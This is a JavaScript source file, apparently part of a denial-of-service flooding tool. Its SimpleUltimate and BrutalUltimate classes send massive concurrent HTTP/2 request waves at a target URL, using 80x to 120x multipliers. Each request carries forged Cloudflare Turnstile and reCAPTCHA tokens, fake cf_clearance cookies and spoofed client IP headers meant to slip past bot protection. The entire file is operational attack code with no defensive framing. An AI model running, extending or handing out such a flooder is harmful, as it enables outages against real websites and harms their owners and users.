import http2 from 'http2';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';

/**
 * SIMPLE ULTIMATE - Method yang reliable dan gacor
 */
export class SimpleUltimate {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = Math.max(rpc * 80, 400); // 80x multiplier
        this.userAgents = userAgents.length > 0 ? userAgents : this.getDefaultUserAgents();
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        
        logger.info('🔥 SIMPLE ULTIMATE initialized - 80x multiplier');
    }

    getDefaultUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);
        
        logger.info('🚀 SIMPLE ULTIMATE starting...');

        while (Date.now() < endTime && this.active) {
            const waves = [];
            // 40 concurrent waves
            for (let i = 0; i < 40; i++) {
                waves.push(this.attack());
            }
            await Promise.allSettled(waves);
        }
    }

    async attack() {
        const promises = [];
        
        for (let i = 0; i < this.rpc; i++) {
            if (!this.active) break;
            promises.push(this.sendRequest());
        }

        await Promise.allSettled(promises);
    }

    generateHeaders() {
        const userAgent = Tools.randomChoice(this.userAgents);
        
        // Generate bypass tokens on-the-fly
        const turnstileToken = this.generateTurnstileToken();
        const cfClearance = this.generateCfClearance();

        const headers = {
            ':method': 'GET',
            ':scheme': this.url.protocol.replace(':', ''),
            ':authority': this.url.hostname,
            ':path': this.url.pathname + this.url.search + (this.url.search ? '&' : '?') + `t=${Date.now()}&r=${Math.random()}`,
            
            'user-agent': userAgent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': Tools.randomChoice(['en-US,en;q=0.9', 'id-ID,id;q=0.9,en;q=0.8']),
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': Tools.randomChoice(['no-cache', 'max-age=0']),
            
            // Security headers
            'sec-ch-ua': this.generateSecChUa(userAgent),
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': this.getPlatform(userAgent),
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'dnt': '1',
            
            // CAPTCHA bypass
            'cf-turnstile-response': turnstileToken,
            'g-recaptcha-response': turnstileToken,
            
            // CF bypass
            'cookie': `cf_clearance=${cfClearance}; __cf_bm=${Tools.randomString(43)}`,
            
            // Spoofing
            'cf-ray': `${Tools.randomString(16)}-SJC`,
            'cf-connecting-ip': Tools.randomIPv4(),
            'x-forwarded-for': Tools.randomIPv4(),
            'x-real-ip': Tools.randomIPv4()
        };

        return headers;
    }

    generateTurnstileToken() {
        // Simple Turnstile token format
        const part1 = Tools.randomString(64);
        const part2 = Tools.randomString(32);
        const part3 = Tools.randomString(64);
        return `0.${part1}.${part2}.${part3}`;
    }

    generateCfClearance() {
        return `${Tools.randomString(32)}-${Date.now()}`;
    }

    generateSecChUa(userAgent) {
        if (userAgent.includes('Chrome/120')) {
            return '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
        } else if (userAgent.includes('Firefox')) {
            return '';
        }
        return '"Not_A Brand";v="99", "Chromium";v="120"';
    }

    getPlatform(userAgent) {
        if (userAgent.includes('Windows')) return '"Windows"';
        if (userAgent.includes('Macintosh')) return '"macOS"';
        if (userAgent.includes('Linux')) return '"Linux"';
        return '"Unknown"';
    }

    async sendRequest() {
        return new Promise((resolve) => {
            try {
                const headers = this.generateHeaders();
                
                const client = http2.connect(`${this.url.protocol}//${this.url.hostname}`, {
                    settings: {
                        headerTableSize: 65536,
                        initialWindowSize: 6291456,
                        maxFrameSize: 16384
                    }
                });

                client.on('error', () => {
                    client.close();
                    resolve();
                });

                const req = client.request(headers);

                req.on('response', (responseHeaders) => {
                    REQUESTS_SENT.add(1);
                    
                    const status = responseHeaders[':status'];
                    if (status === 200 || status === 302) {
                        logger.debug(`✅ SIMPLE ULTIMATE success! Status: ${status}`);
                    }
                });

                req.on('data', (chunk) => {
                    BYTES_SENT.add(chunk.length);
                });

                req.on('end', () => {
                    client.close();
                    resolve();
                });

                req.on('error', () => {
                    client.close();
                    resolve();
                });

                req.setTimeout(5000, () => {
                    req.close();
                    client.close();
                    resolve();
                });

                req.end();

            } catch (error) {
                resolve();
            }
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * BRUTAL ULTIMATE - Method yang lebih aggressive
 */
export class BrutalUltimate {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = Math.max(rpc * 120, 600); // 120x multiplier - BRUTAL!
        this.userAgents = userAgents.length > 0 ? userAgents : this.getDefaultUserAgents();
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        
        // Initialize simple ultimate
        this.simpleUltimate = new SimpleUltimate(targetUrl, 1, 1, userAgents, referers, proxies);
        
        logger.info('💀 BRUTAL ULTIMATE initialized - 120x multiplier');
    }

    getDefaultUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);
        
        logger.info('💀 BRUTAL ULTIMATE launching...');

        while (Date.now() < endTime && this.active) {
            const waves = [];
            // 60 concurrent waves - BRUTAL
            for (let i = 0; i < 60; i++) {
                waves.push(this.brutalAttack());
            }
            await Promise.allSettled(waves);
        }
    }

    async brutalAttack() {
        const promises = [];
        
        for (let i = 0; i < this.rpc; i++) {
            if (!this.active) break;
            
            // Mix attack strategies
            if (i % 3 === 0) {
                promises.push(this.simpleUltimate.sendRequest());
            } else if (i % 3 === 1) {
                promises.push(this.sendBrutalRequest());
            } else {
                promises.push(this.sendOverloadRequest());
            }
        }

        await Promise.allSettled(promises);
    }

    async sendBrutalRequest() {
        // Brutal request with minimal headers
        return new Promise((resolve) => {
            try {
                const headers = {
                    ':method': 'GET',
                    ':scheme': this.url.protocol.replace(':', ''),
                    ':authority': this.url.hostname,
                    ':path': this.url.pathname + `?brutal=${Date.now()}`,
                    'user-agent': Tools.randomChoice(this.userAgents),
                    'cf-turnstile-response': `0.${Tools.randomString(64)}.${Tools.randomString(32)}.${Tools.randomString(64)}`
                };

                const client = http2.connect(`${this.url.protocol}//${this.url.hostname}`);
                
                client.on('error', () => {
                    client.close();
                    resolve();
                });

                const req = client.request(headers);

                req.on('response', () => {
                    REQUESTS_SENT.add(1);
                });

                req.on('data', (chunk) => {
                    BYTES_SENT.add(chunk.length);
                });

                req.on('end', () => {
                    client.close();
                    resolve();
                });

                req.on('error', () => {
                    client.close();
                    resolve();
                });

                req.setTimeout(3000, () => {
                    req.close();
                    client.close();
                    resolve();
                });

                req.end();

            } catch (error) {
                resolve();
            }
        });
    }

    async sendOverloadRequest() {
        // System overload request
        return this.sendBrutalRequest();
    }

    stop() {
        this.active = false;
        this.simpleUltimate.stop();
    }
}
